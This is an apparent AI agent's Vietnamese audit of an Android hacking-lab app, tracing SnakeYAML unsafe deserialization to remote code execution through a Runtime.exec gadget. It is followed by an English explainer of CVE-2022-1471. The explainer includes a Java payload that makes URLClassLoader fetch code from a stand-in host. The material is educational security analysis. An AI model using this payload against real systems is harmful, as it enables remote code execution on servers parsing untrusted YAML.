Findings

  - Critical: Thư viện có khả năng dẫn tới RCE ở đây là SnakeYAML (org.yaml.snakeyaml). App parse YAML bằng new Yaml(dumperOptions) rồi yaml.load(inputStream)
    trên dữ liệu do bên ngoài kiểm soát tại app/src/main/java/com/mobilehackinglab/configeditor/MainActivity.java:273 và app/src/main/java/com/mobilehackinglab/
    configeditor/MainActivity.java:274. Trong bản SnakeYAML được bundle, constructor này mặc định dùng new Constructor(new LoaderOptions()), không phải
    SafeConstructor, xem app/src/main/java/org/yaml/snakeyaml/Yaml.java:46 và app/src/main/java/org/yaml/snakeyaml/Yaml.java:47.
  - Critical: SnakeYAML ở đây cho phép resolve global tag thành class tùy ý rồi gọi constructor Java. ConstructYamlObject lấy class từ tag tại app/src/main/java/
    org/yaml/snakeyaml/constructor/Constructor.java:235 và app/src/main/java/org/yaml/snakeyaml/constructor/Constructor.java:555, sau đó ConstructScalar gọi
    constructor 1 tham số của class đích tại app/src/main/java/org/yaml/snakeyaml/constructor/Constructor.java:267 và app/src/main/java/org/yaml/snakeyaml/
    constructor/Constructor.java:302. App lại có gadget nội bộ app/src/main/java/com/mobilehackinglab/configeditor/LegacyCommandUtil.java:15 mà constructor gọi
    Runtime.getRuntime().exec(command) tại app/src/main/java/com/mobilehackinglab/configeditor/LegacyCommandUtil.java:17. Đây là mắt xích biến unsafe
    deserialization thành RCE.
  - High: Đường tấn công là remotely reachable. MainActivity được export và nhận VIEW với file/http/https cho YAML tại app/src/main/AndroidManifest.xml:34 và
    app/src/main/AndroidManifest.xml:41. App biến URI thành URL ở app/src/main/java/com/mobilehackinglab/configeditor/CopyUtil.java:48, tải nội dung bằng
    HttpURLConnection ở app/src/main/java/com/mobilehackinglab/configeditor/CopyUtil$Companion$copyFileFromUri$1.java:88, và còn bật cleartext HTTP tại app/src/
    main/res/xml/network_security_config.xml:3.

  Kết luận
  Thư viện cần báo cáo là SnakeYAML (org.yaml.snakeyaml). Điểm RCE không phải vì mọi deployment của thư viện này đều tự động RCE, mà vì app đang dùng Yaml.load()
  không an toàn trên dữ liệu từ ngoài và classpath của app có gadget LegacyCommandUtil.

  Exact version của SnakeYAML không hiện rõ trong source đã unpack, nhưng code path là kiểu SnakeYAML classic permissive, đủ để kết luận đây là lỗ hổng unsafe
  YAML deserialization dẫn tới RCE trong challenge này. Tôi chưa chạy exploit động; kết luận trên dựa trên audit mã. Nếu cần, tôi có thể tiếp tục viết cho bạn
  phần PoC ở mức an toàn hoặc phần hướng dẫn vá lỗi.

  `codex resume 019d95b5-f9be-78d3-9239-ed57cfc51636`

# Understanding CVE-2022-1471
CVE-2022-1471 is a vulnerability caused by unsafe deserialization in SnakeYAML. The library allows arbitrary objects to be deserialized.

Attackers can exploit this behavior to execute malicious code on the server. This can happen when SnakeYAML deserializes untrusted YAML input containing unexpected or dangerous object types:
```java
public void parse() {
    String exploitPayload = "!!javax.script.ScriptEngineManager [\n" +
            "    !!java.net.URLClassLoader [[\n" +
            "        !!java.net.URL [\"http://dosattack/\"]\n" +
            "    ]]\n" +
            "]";

    // Unsafe YAML parsing
    Yaml yaml = new Yaml();
    Object result = yaml.load(exploitPayload);

    log.info("Deserialized object: {}", result);
}
```
This parse() method processes a malicious YAML payload that attempts to load an external resource using URLClassLoader. It highlights how untrusted YAML input can lead to the deserialization of dangerous object types, potentially enabling attackers to execute malicious code.

Such vulnerabilities can lead to Remote Code Execution (RCE), making it a critical security concern.

